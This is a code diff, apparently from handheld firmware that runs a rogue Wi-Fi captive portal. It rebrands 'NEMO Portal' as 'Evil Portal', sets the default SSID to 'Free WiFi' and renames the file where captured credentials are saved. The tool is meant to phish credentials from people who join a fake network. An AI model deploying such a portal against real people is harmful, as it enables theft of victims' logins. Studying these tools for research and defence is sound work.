@@ -3,8 +3,8 @@
 // Retaining the Portuguese translations since this project has a large
 // fan base in Brazil. Shouts to CyberJulio as well.
 
-#define DEFAULT_AP_SSID_NAME "NEMO Free WiFi"
-#define SD_CREDS_PATH "/nemo-portal-creds.txt"
+#define DEFAULT_AP_SSID_NAME "Free WiFi"
+#define SD_CREDS_PATH "/fuck-nemo-portal-creds.txt"
 
 
 #if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) && defined(LANGUAGE_IT_IT) && defined(LANGUAGE_FR_FR)
@@ -163,7 +163,7 @@ void printHomeToScreen() {
   DISP.setTextSize(MEDIUM_TEXT);
   DISP.setTextColor(BGCOLOR, FGCOLOR);
   DISP.setCursor(0, 0);
-  DISP.println(" NEMO PORTAL ");
+  DISP.println(" EVIL PORTAL ");
   DISP.setTextSize(SMALL_TEXT);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.printf("%s\n\n",apSsidName.c_str());
@@ -241,7 +241,7 @@ String index_POST() {
 }
 
 String ssid_GET() {
-  return getHtmlContents("<p>Set a new SSID for NEMO Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
+  return getHtmlContents("<p>Set a new SSID for Evil Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
 }
 
 String ssid_POST() {
@@ -249,7 +249,7 @@ String ssid_POST() {
   Serial.println("SSID Has been changed to " + ssid);
   setSSID(ssid);
   printHomeToScreen();
-  return getHtmlContents("NEMO Portal shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
+  return getHtmlContents("Evil Portal shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
 }
 
 String clear_GET() {
